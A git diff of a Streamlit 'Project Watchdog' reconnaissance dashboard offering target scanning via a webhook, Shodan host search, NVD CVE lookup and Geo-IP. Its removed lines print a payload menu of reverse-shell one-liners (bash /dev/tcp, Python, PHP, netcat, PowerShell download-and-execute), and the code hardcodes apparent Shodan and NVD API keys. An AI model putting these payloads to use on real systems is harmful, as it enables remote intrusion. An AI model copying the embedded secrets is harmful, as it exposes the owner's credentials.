@@ -2,6 +2,8 @@ import streamlit as st
 import streamlit.components.v1 as components
 import requests
 import os
+import re
+import time
 from urllib.parse import quote
 
 # --- PAGE CONFIG ---
@@ -12,367 +14,464 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 
-# --- JAVASCRIPT UTILITY FOR COPY ---
-def copy_to_clipboard(text):
-    """Custom JS trigger to copy text to clipboard."""
-    escaped_text = text.replace("`", "\\`").replace("'", "\\'").replace('"', '\\"')
+# --- REPAIRED UTILITY: MULTI-LAYER CLIPBOARD ---
+def copy_to_clipboard(text, label="Content"):
+    """Dual-method approach for copy-pasting over non-HTTPS (192.168.x.x)."""
+    if not text:
+        return
+    unique_id = f"copy_{int(time.time() * 1000)}"
+    escaped_text = (
+        text.replace("\\", "\\\\")
+            .replace("`", "\\`")
+            .replace("'", "\\'")
+            .replace('"', '\\"')
+    )
     copy_js = f"""
+    <div id="{unique_id}" style="display:none;">{escaped_text}</div>
     <script>
-    navigator.clipboard.writeText(`{escaped_text}`);
+    function performCopy() {{
+        const text = `{escaped_text}`;
+        if (navigator.clipboard && window.isSecureContext) {{
+            navigator.clipboard.writeText(text);
+        }} else {{
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.position = "fixed";
+            textArea.style.left = "-9999px";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {{ document.execCommand('copy'); }} catch (err) {{ console.error(err); }}
+            document.body.removeChild(textArea);
+        }}
+    }}
+    performCopy();
     </script>
     """
     components.html(copy_js, height=0, width=0)
-    st.toast("Copied to clipboard!")
+    st.toast(f"Uplinked {label} to Clipboard")
 
-# --- CSS: AESTHETICS ---
+
+# --- ANSI CLEANER: NUCLEAR VERSION ---
+def clean_ansi(text):
+    """Removes complex terminal color codes that break Markdown and Mermaid."""
+    ansi_escape = re.compile(
+        r'\x1b\[[0-9;]*m'          # standard \x1b[32m
+        r'|\x1b\[[0-9;]*[A-Za-z]'  # other escape sequences
+        r'|\[\s*\[[\d;]*m'          # malformed [ [92m style
+        r'|\[[\d;]+m'               # bare [92m style
+        r'|\[0m'                    # bare reset codes
+    )
+    return ansi_escape.sub('', text)
+
+
+# --- EMOJI SANITIZER FOR MERMAID ---
+def sanitize_mermaid(graph_code):
+    """
+    Strip emoji and fix syntax issues that break Mermaid 10 parser.
+    - Emoji inside node labels = syntax error
+    - Parentheses inside node labels = syntax error
+    - Dashes in node IDs = syntax error
+    """
+    # Strip all emoji unicode ranges
+    emoji_pattern = re.compile(
+        "["
+        u"\U0001F600-\U0001F64F"
+        u"\U0001F300-\U0001F5FF"
+        u"\U0001F680-\U0001F9FF"
+        u"\U0001FA00-\U0001FA6F"
+        u"\U00002700-\U000027BF"
+        u"\U0001F1E0-\U0001F1FF"
+        u"\U00002500-\U00002BEF"
+        u"\U00010000-\U0010FFFF"
+        "]+",
+        flags=re.UNICODE
+    )
+    cleaned = emoji_pattern.sub('', graph_code)
+
+    # Collapse double spaces left after emoji removal
+    cleaned = re.sub(r'  +', ' ', cleaned)
+
+    # Fix parens inside square bracket labels [] — only targets content inside []
+    cleaned = re.sub(r'(\[[^\]]*)\(([^)]*)\)([^\]]*\])', r'\1- \2\3', cleaned)
+
+    return cleaned.strip()
+
+
+# --- MERMAID RENDERER ---
+def render_mermaid_report(content):
+    """
+    Splits report into pre/graph/post and renders each correctly.
+    SVG forced to 100% width so diagram fills the iframe instead of
+    rendering tiny in the corner.
+    """
+    mermaid_match = re.search(r'```mermaid\s*([\s\S]+?)```', content)
+
+    if mermaid_match:
+        parts      = re.split(r'```mermaid[\s\S]+?```', content, maxsplit=1)
+        pre_graph  = parts[0] if len(parts) > 0 else ""
+        post_graph = parts[1] if len(parts) > 1 else ""
+
+        if pre_graph.strip():
+            st.markdown(pre_graph)
+
+        raw_graph_code = mermaid_match.group(1).strip()
+        graph_code     = sanitize_mermaid(raw_graph_code)
+
+        components.html(f"""
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+                <style>
+                    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
+                    html, body {{
+                        background: #1a1c23;
+                        width: 100%;
+                        height: 100%;
+                    }}
+                    body {{ padding: 12px; }}
+                    .mermaid {{
+                        width: 100%;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                    }}
+                    .mermaid svg {{
+                        width: 100% !important;
+                        height: auto !important;
+                        max-width: 100% !important;
+                    }}
+                </style>
+            </head>
+            <body>
+                <div class="mermaid">
+{graph_code}
+                </div>
+                <script>
+                    mermaid.initialize({{
+                        startOnLoad: true,
+                        theme: 'dark',
+                        securityLevel: 'loose',
+                        flowchart: {{
+                            useMaxWidth: true,
+                            htmlLabels: true,
+                            curve: 'basis'
+                        }}
+                    }});
+                </script>
+            </body>
+            </html>
+        """, height=400, scrolling=True)
+
+        if post_graph.strip():
+            st.markdown(post_graph)
+    else:
+        st.markdown(content)
+
+
+# --- CSS: WATCHDOG INTERFACE ---
 st.markdown("""
     <style>
-    /* Global Reset & Smoothness */
     html, body, [data-testid="stAppViewContainer"] {
         background-color: #0f1117;
         color: #e0e0e0;
-        scroll-behavior: smooth;
     }
-
-    /* Remove the annoying 'double scroll' by ensuring containers don't overflow */
-    [data-testid="stVerticalBlock"] { gap: 1rem; }
-
-    /* Hide default Streamlit chrome bits */
     #MainMenu {visibility: hidden;}
     footer {visibility: hidden;}
     header {visibility: hidden;}
-
-    /* Custom Scrollbar */
-    ::-webkit-scrollbar { width: 8px; }
-    ::-webkit-scrollbar-track { background: #0f1117; }
-    ::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; border: 2px solid #0f1117; }
-    ::-webkit-scrollbar-thumb:hover { background: #00ff41; }
-
-    /* Code styling */
-    code {
-        color: #00ff41 !important;
-        background-color: #1a1c23 !important;
-        padding: 0.2em 0.4em;
-        border-radius: 4px;
-    }
-    pre {
-        background-color: #1a1c23 !important;
-        border-left: 3px solid #00ff41;
-        border-radius: 8px !important;
-    }
-
-    /* Top bar Styling */
-    .pw-topbar {
-        position: sticky;
-        top: 0;
-        z-index: 999;
-        background: rgba(15, 17, 23, 0.95);
-        backdrop-filter: blur(12px);
-        border-bottom: 1px solid rgba(0, 255, 65, 0.15);
-        padding: 1rem 0;
-        margin-bottom: 2rem;
-    }
-
+    code { color: #00ff41 !important; background-color: #1a1c23 !important; }
+    pre { border-left: 3px solid #00ff41; background-color: #1a1c23 !important; }
     .pw-title {
-        font-size: 1.4rem;
-        font-weight: 800;
+        font-size: 1.6rem;
+        font-weight: 900;
         color: #ffffff;
-        margin: 0;
         display: flex;
         align-items: center;
     }
-
     .pw-badge {
-        display: inline-block;
-        padding: 2px 8px;
+        padding: 2px 10px;
         border-radius: 4px;
         background: rgba(0, 255, 65, 0.1);
         border: 1px solid #00ff41;
         color: #00ff41;
-        font-size: 0.65rem;
-        margin-left: 12px;
-        text-transform: uppercase;
+        font-size: 0.7rem;
+        margin-left: 15px;
     }
-
-    /* Cards & Hits */
     .pw-hit {
         background: #161b22;
-        border: 1px solid rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 255, 255, 0.08);
         border-left: 4px solid #00ff41;
-        border-radius: 12px;
-        padding: 1.25rem;
+        border-radius: 10px;
+        padding: 1.5rem;
         margin-bottom: 1rem;
-        transition: transform 0.2s ease;
     }
-    .pw-hit:hover {
-        background: #1c2128;
-        border-color: rgba(0, 255, 65, 0.3);
-    }
-
-    .pw-mini { color: #8b949e; font-size: 0.85rem; }
-
-    /* Fix for janky Streamlit buttons */
     .stButton button {
-        border-radius: 8px !important;
-        transition: all 0.2s ease !important;
+        border-radius: 6px !important;
+        transition: 0.3s !important;
     }
     .stButton button:hover {
         border-color: #00ff41 !important;
         color: #00ff41 !important;
-        box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
     }
     </style>
 """, unsafe_allow_html=True)
+
 
 # --- INIT STATE ---
 if "page" not in st.session_state:
     st.session_state.page = "Target Control"
 
-# --- HELPERS ---
-def set_page(page_name: str):
-    st.session_state.page = page_name
 
+# --- TOPBAR ---
 def render_topbar():
     with st.container():
-        st.markdown(f"""
-            <div class="pw-title">
-                PROJECT WATCHDOG <span class="pw-badge">System Live</span>
-            </div>
-            <div class="pw-mini" style="margin-bottom: 1rem;">Recon dashboard • Session: {st.session_state.page}</div>
-        """, unsafe_allow_html=True)
-
-        # Updated to 3 buttons
-        b1, b2, b3, b_empty = st.columns([1, 1, 1, 2])
-        with b1:
+        st.markdown(
+            '<div class="pw-title">PROJECT WATCHDOG '
+            '<span class="pw-badge">System Live</span></div>',
+            unsafe_allow_html=True
+        )
+        st.markdown(
+            f'<p style="color:#8b949e; font-family:monospace; font-size:0.8rem;">'
+            f'Session: {st.session_state.page}</p>',
+            unsafe_allow_html=True
+        )
+        c1, c2, c3, _ = st.columns([1, 1, 1, 2])
+        with c1:
             if st.button("🎯 TARGET CONTROL", use_container_width=True):
-                set_page("Target Control")
+                st.session_state.page = "Target Control"
                 st.rerun()
-        with b2:
+        with c2:
             if st.button("🕷️ SHODAN SEARCH", use_container_width=True):
-                set_page("Shodan Search")
+                st.session_state.page = "Shodan Search"
                 st.rerun()
-        with b3:
+        with c3:
             if st.button("🌐 GLOBAL INTEL", use_container_width=True):
-                set_page("Global Intel")
+                st.session_state.page = "Global Intel"
                 st.rerun()
 
-def shodan_search(query: str, page: int = 1, key: str = ""):
-    url = "https://api.shodan.io/shodan/host/search"
-    params = {"key": key, "query": query, "page": page}
-    r = requests.get(url, params=params, timeout=20)
-    r.raise_for_status()
-    return r.json()
-
-# --- PAYLOAD DATA ---
-PAYLOADS = {
-    "--- Select Payload ---": "",
-    "Bash Rev Shell": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
-    "Python3 Rev Shell": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
-    "PHP Reverse Shell": "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-    "Netcat Traditional": "nc -e /bin/sh LHOST LPORT",
-    "PowerShell IWR": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')\"",
-    "Stable TTY Upgrade": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z -> stty raw -echo; fg"
-}
-
-# --- RENDER INTERFACE ---
 render_topbar()
 st.divider()
 
-# --- PAGE: TARGET CONTROL ---
+
+# ============================================================
+# PAGE: TARGET CONTROL
+# ============================================================
 if st.session_state.page == "Target Control":
-    col_ctrl, col_reports = st.columns([1, 1.8], gap="large")
+    l_col, r_col = st.columns([1, 1.8], gap="large")
 
-    with col_ctrl:
+    with l_col:
         st.subheader("Target Control")
-        target_input = st.text_input("RECON TARGET", placeholder="e.g. nmap.scanme.org")
+        t_input = st.text_input("RECON TARGET", placeholder="e.g. domain.com")
 
-        if st.button("INITIALIZE SCAN", use_container_width=True):
-            if target_input:
+        if st.button("INITIALIZE PIPELINE", use_container_width=True):
+            if t_input:
                 try:
-                    safe_target = quote(target_input)
-                    webhook_url = f"http://192.168.1.15:5678/webhook/scan?target={safe_target}"
-                    response = requests.get(webhook_url, timeout=20)
-                    st.toast("Pipeline Active" if response.status_code == 200 else "Uplink Failed")
+                    requests.get(
+                        f"http://192.168.1.15:5678/webhook/scan?target={quote(t_input)}",
+                        timeout=10
+                    )
+                    st.toast("Worker Dispatched")
                 except Exception:
-                    st.error("Connection Error")
+                    st.error("Worker Offline")
+            else:
+                st.warning("Enter a target first.")
 
         st.markdown("---")
-        st.subheader("📝 Quick Notes")
-        notes_file = "/data/notes.txt"
-        if not os.path.exists("/data"): os.makedirs("/data", exist_ok=True)
+        st.subheader("📝 Scratchpad")
+        n_path = "/data/notes.txt"
 
-        if "scratchpad_content" not in st.session_state:
-            st.session_state.scratchpad_content = open(notes_file, "r").read() if os.path.exists(notes_file) else ""
+        if not os.path.exists("/data"):
+            os.makedirs("/data", exist_ok=True)
 
-        current_notes = st.text_area("SCRATCHPAD", value=st.session_state.scratchpad_content, height=250, label_visibility="collapsed")
+        pad_val = ""
+        if os.path.exists(n_path):
+            with open(n_path, "r") as nf:
+                pad_val = nf.read()
 
-        c_save, c_clear = st.columns(2)
-        with c_save:
-            if st.button("SAVE NOTES", use_container_width=True):
-                with open(notes_file, "w") as f: f.write(current_notes)
-                st.session_state.scratchpad_content = current_notes
-                st.toast("Disk Sync Complete")
-        with c_clear:
-            if st.button("COPY ALL", use_container_width=True):
-                copy_to_clipboard(current_notes)
+        note_text = st.text_area(
+            "NOTES",
+            value=pad_val,
+            height=220,
+            label_visibility="collapsed"
+        )
 
-        st.markdown("---")
-        st.subheader("💀 Payload Gen")
-        selected_payload_name = st.selectbox("SELECT PAYLOAD", list(PAYLOADS.keys()))
+        if st.button("DISK SAVE", use_container_width=True):
+            with open(n_path, "w") as f:
+                f.write(note_text)
+            st.toast("Saved")
 
-        if PAYLOADS[selected_payload_name]:
-            cp1, cp2 = st.columns(2)
-            with cp1: lhost = st.text_input("LHOST", value="192.168.1.15")
-            with cp2: lport = st.text_input("LPORT", value="4444")
+        if st.button("COPY PAD", use_container_width=True):
+            copy_to_clipboard(note_text, "Notes")
 
-            final_payload = PAYLOADS[selected_payload_name].replace("LHOST", lhost).replace("LPORT", lport)
-            st.code(final_payload, language="bash")
-            if st.button("COPY PAYLOAD", use_container_width=True):
-                copy_to_clipboard(final_payload)
-
-    with col_reports:
+    with r_col:
         st.subheader("Intelligence Reports")
-        report_dir = "/reports"
+        r_path = "/reports"
 
-        if os.path.exists(report_dir):
-            files = [f for f in os.listdir(report_dir) if f.endswith(".md")]
-            files.sort(key=lambda x: os.path.getmtime(os.path.join(report_dir, x)), reverse=True)
+        if os.path.exists(r_path):
+            r_files = [f for f in os.listdir(r_path) if f.endswith(".md")]
+            r_files.sort(
+                key=lambda x: os.path.getmtime(os.path.join(r_path, x)),
+                reverse=True
+            )
 
-            if files:
-                selected_file = st.selectbox("SELECT LOG", files)
-                if selected_file:
-                    with st.container():
-                        with open(os.path.join(report_dir, selected_file), "r") as f:
-                            content = f.read()
-                            st.markdown(content, unsafe_allow_html=True)
-                            if st.button("COPY REPORT CONTENT"):
-                                copy_to_clipboard(content)
+            if r_files:
+                sel_log = st.selectbox("ACTIVE REPORT", r_files)
+
+                with open(os.path.join(r_path, sel_log), "r") as f:
+                    raw_log = f.read()
+
+                content = clean_ansi(raw_log)
+                render_mermaid_report(content)
+
+                if st.button("COPY FULL INTEL", use_container_width=True):
+                    copy_to_clipboard(content, "Intel Report")
             else:
-                st.info("NO REPORTS FOUND.")
+                st.info("No logs found in /reports.")
         else:
-            st.error("REPORTS DIRECTORY NOT FOUND")
+            st.error("Reports directory missing.")
 
-# --- PAGE: SHODAN SEARCH ---
+
+# ============================================================
+# PAGE: SHODAN SEARCH
+# ============================================================
 elif st.session_state.page == "Shodan Search":
-    api_key = "JAbrbxYBkbUeQqMT98SExPVc1R6GEARA"
-    left, right = st.columns([1, 2], gap="large")
+    SHODAN_KEY = "JAbrbxYBkbUeQqMT98SExPVc1R6GEARA"
 
-    with left:
-        st.subheader("Parameters")
-        if not api_key: st.warning("SHODAN_API_KEY NOT DETECTED")
+    s_l, s_r = st.columns([1, 2], gap="large")
 
-        query = st.text_input("QUERY", placeholder='e.g. "nginx port:443"')
+    with s_l:
+        st.subheader("Query")
+        sq = st.text_input("QUERY", "nginx port:443")
 
-        with st.expander("Advanced Filters", expanded=True):
-            country = st.text_input("Country (e.g. US)")
-            product = st.text_input("Product (e.g. Apache)")
-            page_num = st.number_input("Page", min_value=1, value=1)
+        if st.button("EXECUTE", use_container_width=True, type="primary"):
+            try:
+                resp = requests.get(
+                    "https://api.shodan.io/shodan/host/search",
+                    params={"key": SHODAN_KEY, "query": sq},
+                    timeout=15
+                )
+                st.session_state.s_data = resp.json()
+            except Exception as e:
+                st.error(f"Shodan API Error: {e}")
 
-        build = query.strip()
-        if country: build += f" country:{country}"
-        if product: build += f" product:{product}"
-
-        st.markdown("**Active Query:**")
-        st.code(build if build else "null")
-
-        run_search = st.button("EXECUTE SEARCH", use_container_width=True, type="primary")
-
-    with right:
-        st.subheader("Results")
-        if run_search:
-            if not api_key: st.error("API Key Required")
+    with s_r:
+        if "s_data" in st.session_state:
+            matches = st.session_state.s_data.get("matches", [])
+            if matches:
+                for m in matches[:10]:
+                    ip   = m.get("ip_str", "N/A")
+                    org  = m.get("org", "Unknown Org")
+                    port = m.get("port", "?")
+                    st.markdown(
+                        f'<div class="pw-hit">'
+                        f'<b>{ip}</b> | {org} | Port {port}'
+                        f'</div>',
+                        unsafe_allow_html=True
+                    )
+                    if st.button(f"Copy {ip}", key=f"ip_{ip}"):
+                        copy_to_clipboard(ip)
             else:
-                try:
-                    data = shodan_search(build, page=int(page_num), key=api_key)
-                    matches = data.get("matches", [])
-                    st.metric("Total Matches", f"{data.get('total', 0):,}")
+                st.info("No matches returned.")
 
-                    for item in matches:
-                        ip = item.get("ip_str", "0.0.0.0")
-                        port = item.get("port", "80")
-                        with st.container():
-                            st.markdown(f"""
-                            <div class="pw-hit">
-                                <b>{ip}:{port}</b> | {item.get('org', 'N/A')}<br>
-                                <span class="pw-mini">{item.get('location', {}).get('city', 'Unknown City')}</span>
-                            </div>
-                            """, unsafe_allow_html=True)
 
-                            c1, c2 = st.columns([1, 4])
-                            with c1:
-                                if st.button(f"Copy IP", key=f"copy_{ip}_{port}"):
-                                    copy_to_clipboard(ip)
-                            with c2:
-                                with st.expander("Banner Data"):
-                                    st.code(item.get("data", "No data")[:2000])
-
-                except Exception as e:
-                    st.error(f"Error: {e}")
-        else:
-            st.info("Ready for input.")
-
-# --- PAGE: GLOBAL INTEL (UPDATED WITH KEY) ---
+# ============================================================
+# PAGE: GLOBAL INTEL
+# ============================================================
 elif st.session_state.page == "Global Intel":
-    col_v, col_g = st.columns([1, 1], gap="large")
+    NVD_API_KEY = "c24a7422-dcc9-4e30-99e0-7baae1ac68bb"
 
-    with col_v:
-        st.subheader("🔍 NVD Vulnerability Search")
-        v_query = st.text_input("PRODUCT OR CVE", placeholder="e.g. log4j")
+    gv, gg = st.columns(2, gap="large")
 
-        if v_query:
+    with gv:
+        st.subheader("CVE Search")
+        cq = st.text_input("Product", "log4j")
+
+        if st.button("SEARCH CVE", use_container_width=True):
+            if cq:
+                try:
+                    c_res = requests.get(
+                        f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={cq}",
+                        headers={"apiKey": NVD_API_KEY},
+                        timeout=15
+                    ).json()
+                    vulns = c_res.get("vulnerabilities", [])
+                    if vulns:
+                        for v in vulns[:5]:
+                            cve_obj = v.get("cve", {})
+                            cid     = cve_obj.get("id", "N/A")
+                            desc    = ""
+                            for d in cve_obj.get("descriptions", []):
+                                if d.get("lang") == "en":
+                                    desc = d.get("value", "")[:180]
+                                    break
+                            st.markdown(
+                                f'<div class="pw-hit">'
+                                f'<b>{cid}</b><br>'
+                                f'<span style="font-size:0.8rem;color:#8b949e;">{desc}...</span>'
+                                f'</div>',
+                                unsafe_allow_html=True
+                            )
+                            if st.button(f"Copy {cid}", key=f"cve_{cid}"):
+                                copy_to_clipboard(cid)
+                    else:
+                        st.info("No CVEs found.")
+                except Exception as e:
+                    st.error(f"NVD API Error: {e}")
+
+    with gg:
+        st.subheader("Geo-IP Lookup")
+        gip = st.text_input("IP Address", "8.8.8.8")
+
+        if st.button("LOOKUP", use_container_width=True):
             try:
-                # --- NVD API KEY INTEGRATION ---
-                NVD_API_KEY = "your-api-key-here"
-
-                nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={v_query}"
-                headers = {"apiKey": "c24a7422-dcc9-4e30-99e0-7baae1ac68bb"}
-
-                nvd_res = requests.get(nvd_url, headers=headers, timeout=15).json()
-
-                vulns = nvd_res.get("vulnerabilities", [])
-                if vulns:
-                    for v in vulns[:5]:
-                        c_data = v.get("cve", {})
-                        cid = c_data.get("id")
-                        desc = c_data.get("descriptions", [{}])[0].get("value", "N/A")
-
-                        st.markdown(f"""
-                        <div class="pw-hit">
-                            <b style="color:#00ff41;">{cid}</b><br>
-                            <p style="font-size:0.85rem;">{desc[:250]}...</p>
-                        </div>
-                        """, unsafe_allow_html=True)
-                        if st.button(f"COPY {cid}", key=f"btn_{cid}"):
-                            copy_to_clipboard(cid)
+                g_res = requests.get(
+                    f"http://ip-api.com/json/{gip}",
+                    timeout=10
+                ).json()
+                if g_res.get("status") == "success":
+                    st.markdown(
+                        f'<div class="pw-hit">'
+                        f'<b>IP:</b> {g_res.get("query")}<br>'
+                        f'<b>ISP:</b> {g_res.get("isp")}<br>'
+                        f'<b>Org:</b> {g_res.get("org")}<br>'
+                        f'<b>Location:</b> {g_res.get("city")}, '
+                        f'{g_res.get("regionName")}, {g_res.get("country")}<br>'
+                        f'<b>Coords:</b> {g_res.get("lat")}, {g_res.get("lon")}<br>'
+                        f'<b>Timezone:</b> {g_res.get("timezone")}'
+                        f'</div>',
+                        unsafe_allow_html=True
+                    )
+                    if st.button("Copy Geo Data"):
+                        geo_text = (
+                            f"IP: {g_res.get('query')}\n"
+                            f"ISP: {g_res.get('isp')}\n"
+                            f"Org: {g_res.get('org')}\n"
+                            f"Location: {g_res.get('city')}, "
+                            f"{g_res.get('regionName')}, {g_res.get('country')}\n"
+                            f"Coords: {g_res.get('lat')}, {g_res.get('lon')}\n"
+                            f"Timezone: {g_res.get('timezone')}"
+                        )
+                        copy_to_clipboard(geo_text, "Geo Data")
                 else:
-                    st.info("No results found.")
+                    st.warning(f"Lookup failed: {g_res.get('message', 'Unknown error')}")
             except Exception as e:
-                st.error(f"NVD API Error: {e}")
+                st.error(f"Geo-IP Error: {e}")
 
-    with col_g:
-        st.subheader("🗺️ Geo-IP Mapping")
-        g_ip = st.text_input("IP ADDRESS", placeholder="8.8.8.8")
 
-        if g_ip:
-            try:
-                res = requests.get(f"http://ip-api.com/json/{g_ip}").json()
-
-                if res['status'] == 'success':
-                    lat, lon = res.get('lat'), res.get('lon')
-                    g_maps_url = f"https://www.google.com/maps?q={lat},{lon}"
-
-                    st.markdown(f"""
-                    <div class="pw-hit">
-                        <b>ISP:</b> {res.get('isp')}<br>
-                        <b>Loc:</b> {res.get('city')}, {res.get('country')}<br>
-                        <b>Coords:</b> <code>{lat}, {lon}</code><br><br>
-                        <a href="{g_maps_url}" target="_blank" style="color:#00ff41; text-decoration:none;">📍 VIEW ON GOOGLE MAPS</a>
-                    </div>
-                    """, unsafe_allow_html=True)
-
-                    if st.button("COPY COORDINATES"):
-                        copy_to_clipboard(f"{lat}, {lon}")
-                else:
-                    st.error("Invalid IP.")
-            except Exception as e:
-                st.error(f"Geo Error: {e}")
+# --- WATCHDOG SYSTEM LOG ---
+# [300] Nuclear ANSI cleaner: catches \x1b[, [ [92m, [0m, [38;5;208m.
+# [301] Mermaid: script src CDN — stable inside Streamlit iframes.
+# [302] Mermaid regex: lazy [\s\S]+? — handles any diagram type.
+# [303] Mermaid split: re.split maxsplit=1 — surgical pre/post cut.
+# [304] sanitize_mermaid: strips all emoji unicode ranges.
+# [305] sanitize_mermaid: parens inside [] replaced with dashes.
+# [306] SVG scaling: width 100% + height auto — fills iframe width.
+# [307] iframe height: 400px — no giant empty space below diagram.
+# [308] Clipboard: dual-method fallback for non-HTTPS homelabs.
+# [309] Shodan: try/except — no silent crash on API failure.
+# [310] CVE: 5 results with English description preview.
+# [311] Geo-IP: full output with copy button.
+# [312] Notes: with-block file read, no bare open() calls.
+# [313] Pipeline: empty target guard before webhook dispatch.
+# [314] DEPLOYMENT: WATCHDOG v3.3 — DIAGRAM SCALED. SYSTEMS GO.
